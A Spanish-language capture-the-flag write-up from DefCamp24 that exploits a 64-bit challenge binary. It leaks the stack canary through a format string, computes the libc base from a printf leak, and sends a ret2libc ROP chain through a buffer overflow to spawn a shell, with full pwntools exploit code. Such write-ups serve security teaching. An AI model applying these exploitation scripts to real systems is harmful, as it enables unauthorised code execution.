---
date: 2024-09-30
tier: easy
author: naibu3
ctf: DefCamp24
---
# Overview

En este reto se ataca un binario de 64 bits con dos [[Buffer overflow]], un *leak de libc* y un [[Format string]], que tendremos que utilizar bypasear un [[Canary]] y [[PIE]].

# Reconocimiento

Se nos da un binario que analizaremos con [[checksec]]:

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Descompilando con [[ghidra]]:

```c
undefined8 main(void) {
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  coffee();
  puts("Party!");
  return 0;
}

void coffee(void)
{
  long in_FS_OFFSET;
  char input [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  
  printf("Coffee Time\n$ ");
  gets(input);      /* BUFFER OVERFLOW */
  printf(input);    /* FORMAT STRING */
  
  printf("What is this? %p\n",printf);    /* LEAK */
  printf("\nCoffee Time\n$ ");
  fread(input,1,0x50,stdin);    /* FORMAT STRING */
  puts(input);
  
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {    /* Canary check */
    __stack_chk_fail();
  }
  return;
}
```

Vemos que si utilizamos el [[Format string]] para leakear el [[Canary]], podemos utilizar el leak de `printf` para calcular la dirección base de libc y mandar una [[ROP - Return Oriented Programming|ropchain]] en el último [[Buffer overflow|BOF]].

# Explotación

## Sacando el Canary

Para filtrar el [[Canary]] debemos utilizar el [[Format string]], concretamente un especificador de formato como `"%n$x"`, e iremos probando con distintas `n` hasta encontrar un valor acabado en `00`. En este caso lo haremos con un script de [[python]]:

```python
#!/bin/python3
from pwn import *

for i in range(0, 15):
	io = process('./chall')
	io.recvuntil(b"$ ")
	io.sendline(f"%{i}$x")
	print(io.recvline().decode())
```

En este caso, vemos que está en la posición `9`.

## Calculando la dirección base de libc

A partir de este punto podemos utilizar [[pwntools]] e ir escribiendo un script para facilitar las cosas:

```python
#! /bin/python3
import re
from pwn import *

libc = ELF('libc-2.31.so')

def start():
    if args.REMOTE:
        return remote('35.234.95.200', 31484)
    else:
        return process('./chall_patched')

io = start()

#1er input -> LEAK CANARY - PRINTF
io.recvuntil(b"$ ")
io.sendline(b"%9$lx")
leaks = io.recvline().decode()

canary = re.search(r'^[0-9a-fA-F]+', leaks).group()
canary = int(canary, 16)

printf_leak = re.search(r'0x[0-9a-fA-F]+', leaks).group()
printf_leak = int(printf_leak, 16)

log.info(f"Canary -> {hex(canary)}")
log.info(f"Printf -> {hex(printf_leak)}")
```

Hasta este punto sólo hemos recogido el valor del leak y del canario. Teniendo el leak, sólo debemos buscar la dirección de `printf` en libc y restársela al leak:

```python
#Calculamos la dir base de libc
base_libc = printf_leak - libc.symbols["printf"]
log.info(f"Base Libc -> {hex(base_libc)}")
```

## Calculando direcciones

Ahora debemos calcular la dirección de `system` y buscar en libc la cadena `/bin/sh`:

```python
#Buscamos la cadena /bin/sh
bin_sh = base_libc + next(libc.search(b'/bin/sh'))
log.info(f"Bin_sh -> {hex(bin_sh)}")

#Calculamos la direccion de system
system = base_libc + libc.symbols['system']
log.info(f"System -> {hex(system)}")
```

## Construyendo el payload

Finalmente, haciendo uso de gadgets de libc podemos cada valor en su registro (hace falta un gadget `ret` que *alinee el stack*):

```python
#2o input
io.recvuntil(b"$ ")

payload = b'A'*24
payload += p64(canary)
payload += b'B'*8
payload += p64(base_libc + 0x23b6a) #0x0000000000023b6a: pop rdi; ret;
payload += p64(bin_sh)
payload += p64(base_libc + 0x22679) #0x0000000000022679: ret;
payload += p64(system)
payload += b'C'*16

io.sendline(payload)

io.interactive()
```

Ejecutamos y deberíamos obtener una shell.